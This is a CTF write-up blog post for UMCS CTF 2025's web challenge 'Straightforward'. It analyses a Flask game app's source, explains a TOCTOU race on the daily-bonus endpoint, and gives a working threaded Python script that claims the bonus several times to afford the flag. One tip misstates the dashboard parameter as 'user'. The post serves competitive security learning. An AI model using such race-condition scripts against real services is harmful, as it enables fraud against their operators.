---
title:  "UMCS CTF 2025 (Preliminary) - Writeup (Web Exploitation - Straightfoward)"
date:   2025-04-14 11:20:00 +0800
categories: [CTF Writeup, Web Exploitation]
tags: [UMCS CTF 2025 (Preliminary)]
---
> This challenge was completed during the CTF.
{: .prompt-info}

## The Problem

![](assets/img/image14.png)

This challenge is about a game center that allows users to register their account, able to claim their early bonus and purchase their gift.

## Step 1 (Initial Analysis)

The first thing you'll see when viewing the url given, you'll be given a main page that allows you to only register your account (seems like cannot login). 

![](assets/img/image13.png)

By clicking the register button, you'll be presented a page to enter a username for registration. Here, you can't register already existing users which causing each account to be unique.

![](assets/img/image15.png)

After entering your username, you'll be presented a page where you can collect a daily bonus (which adds $1000 to your account and can only be claimed once). Other buttons which pique our interest is `Redeem Secret Reward ($3000)` which costs us 3000 dollars and also a logout button.

![](assets/img/image16.png)

From here, we should need to find a way to access the secret reward either by exploiting the balance or find a way to bypass checks and directly access the rewards. We'll see better once we access the source code.

## Step 2 (Analyse the Source Code)

From the struture of the given source code, it uses a Flask python web app with template. Important source code as follows.

app.py

```python
from flask import Flask, request, jsonify, g, render_template, redirect, session, url_for, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)
DATABASE = 'db.sqlite3'

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE, check_same_thread=False)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop('db', None)
    if db:
        db.close()

def init_db():
    db = sqlite3.connect(DATABASE)
    db.executescript('''
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      balance INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS redemptions (
      username TEXT UNIQUE NOT NULL,
      claimed INTEGER NOT NULL
    );
    ''')
    db.commit()
    db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        if not username:
            flash("Username required!", "danger")
            return redirect(url_for('register'))
        db = get_db()
        try:
            db.execute('INSERT INTO users (username, balance) VALUES (?, ?)', (username, 1000))
            db.commit()
        except sqlite3.IntegrityError:
            flash("User exists!", "danger")
            return redirect(url_for('register'))
        session['username'] = username
        return redirect(url_for('dashboard', username=username))
    return render_template('register.html')

@app.route('/claim', methods=['POST'])
def claim():
    if 'username' not in session:
        return redirect(url_for('register'))
    username = session['username']
    db = get_db()
    cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
    row = cur.fetchone()
    if row and row['claimed']:
        flash("You have already claimed your daily bonus!", "danger")
        return redirect(url_for('dashboard'))
    db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
    db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
    db.commit()
    flash("Daily bonus collected!", "success")
    return redirect(url_for('dashboard'))

@app.route('/buy_flag', methods=['POST'])
def buy_flag():
    if 'username' not in session:
        return redirect(url_for('register'))
    username = session['username']
    db = get_db()
    cur = db.execute('SELECT balance FROM users WHERE username=?', (username,))
    row = cur.fetchone()
    if row and row['balance'] >= 3000:
        db.execute('UPDATE users SET balance = balance - 3000 WHERE username=?', (username,))
        db.commit()
        flash("Reward redeemed!", "success")
        return render_template('flag.html')
    else:
        flash("Insufficient funds to redeem the reward.", "danger")
        return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('register'))
    display_user = request.args.get('username') or session['username']
    db = get_db()
    cur = db.execute('SELECT balance FROM users WHERE username=?', (display_user,))
    row = cur.fetchone()
    balance = row['balance'] if row else None
    return render_template('dashboard.html', username=display_user, balance=balance)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == "__main__":
    with app.app_context():
        init_db()
    app.run(host='0.0.0.0', port=7859)
```
{: file="app.py"}
templates/dashboard.html

```html
{% raw %}
<!DOCTYPE html>
<html>
<head>
  <title>Dashboard</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/static/style.css">
</head>
<body class="bg-light">
  <div class="container vh-100 d-flex flex-column justify-content-center align-items-center">
    <div class="card p-4 shadow-sm w-50 text-center">
      <h2>Hello, {{ username }}</h2>
      <p>Your current balance: <strong>${{ balance }}</strong></p>

      <!-- Flash Messages -->
      {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
          <div class="mb-3">
            {% for category, message in messages %}
              <div class="alert alert-{{ category }} alert-dismissible fade show" role="alert">
                {{ message }}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
              </div>
            {% endfor %}
          </div>
        {% endif %}
      {% endwith %}

      <form action="/claim" method="post" class="mb-3">
        <button type="submit" class="btn btn-success w-100">Collect Daily Bonus</button>
      </form>

      <form action="/buy_flag" method="post">
        <button type="submit" class="btn btn-warning w-100">Redeem Secret Reward ($3000)</button>
      </form>
      
      <form action="/logout" method="get" class="mt-3">
        <button type="submit" class="btn btn-secondary w-100">Logout</button>
      </form>
      
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
{% endraw %}
```
{: file="dashboard.html"}

Based on the dashboard, we can confirm that the secret reward is the flag. From all other templates, there isn't a way to do any XSS within the page. Thus, analysing the main app functions would be cruicial instead.

```html
<form action="/buy_flag" method="post">
        <button type="submit" class="btn btn-warning w-100">Redeem Secret Reward ($3000)</button>
</form>
```
{: file="dashboard.html"}

Going through the main app, it seems a typical SQL database. When comes to SQL typically, we would think about SQL injection method. But, if everyone gets the same functionality (no admin dashboard), tricking the system to access any accounts defeats the purpose. If accessing another account that have enough to buy the flag, it would motivate to go through this path. Since the name of the challenge is Straight forward, then it would be a straight possible solution.

After going through many solutions, SQL database have a weakness itself and that is concurrent data modification. After modifying the data inside SQL, you'll have to commit it in order for the changes to take place. Due to this nature, it has to commit each one of the transaction. Thus, each transaction requires some time to process and this is what we want. We can try to simultaneously request the server to add the bonus before it could set the redemption status to claimed. This theortically could make the money claim at least twice to reach our target.

Therefore, this attack is called `TOCTOU (Time of Check Time of Use)` which means that should have two execution being done in sequence but could be attack between the time of both operations. In the current we are doing, we are trying to do add double bonus while the system is busy with checking the data. Once a check has been done, the system already commit one time and runs another time of bonus which results in double bonus. You can read more here. [(1)](https://www.firewalls.com/blog/security-terms/time-check-time-use/?srsltid=AfmBOor0FcMNSAJMyDnfGwevtnecK7xjeZfuEnKWJzHkbsXunyeT-SNu) [(2)](https://www.packetlabs.net/posts/what-are-tocttou-vulnerabilities/) [(3)](https://sushmitamallick.medium.com/i-am-root-tocttou-attack-c65d51b51a40)

## Step 3 (Exploitation)

After we know what to exploit, we can get to work for crafting the script. We need the script to do what a user would do.

1. Create user account
2. Redeem bonus
3. Buy the secret item
4. Display the result

Step 2 is our exploitation point and we need step 3 because we couldn't logged in.

> Actually we can logged in into another account. The way users view their profile is via the query tag `<url>?user=<username>` but there is a catch. You'll need to be logged in first with another account since it checks if you have like a token to verify if you're logged in. You won't be able to access the dashboard if you haven't register an account yet. You can also buy the flag via that way too if you decide to exploit seperately.
{: .prompt-tip}

Since we are going to automate instead, might as well we automate all of them.

I have created a python script (yay go python) that automates all of this.

```python
import requests
from concurrent.futures import ThreadPoolExecutor
import re

BASE = "<ip address>"  # change this to the actual host
USERNAME = "randomuser1234" # any username will do
session = requests.Session()

print("ready")

# Register the user
session.post(f"{BASE}/register", data={"username": USERNAME})

print("registered! attempting")

# Race the /claim endpoint
def claim():
    return session.post(f"{BASE}/claim")

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(claim) for _ in range(10)]
    for future in futures:
        future.result()
        
print("task completed checking balance")

# Check the balance
dashboard = session.get(f"{BASE}/dashboard").text
balance_match = re.search(r"balance: <strong>\$(\d+)</strong>", dashboard)
balance = int(balance_match.group(1)) if balance_match else 0
print(f"[+] Current balance: ${balance}")

print("attempting to redeem flag")

# Redeem flag if enough money
if balance >= 3000:
    r = session.post(f"{BASE}/buy_flag")
    flag_match = re.search(r"UMCS\{.*?\}", r.text)
    if flag_match:
        print(f"[🏁] FLAG: {flag_match.group(0)}")
    else:
        print("[!] Flag not found in response.")
else:
    print("[!] Not enough balance to redeem the flag.")
```

The script creates a session so that it maintains the access to the website and claims it for us. The system creates an account, setups a max 10 threads that attempts to claim the bonus and redeems the flag for us.

>Running the script allows us to obtain the flag which is `UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}`
{: .prompt-tip}

![](assets/img/image17.png)

## Closing

So far, till this point, I was quite happy with what progress I did. It didn't took long enough for me to do this (thank god to those database lecturers!). Therefore, I didn't expect to finish till this point and from this point I was expecting to complete all the web challenges in this ctf. Thank you and we'll see again.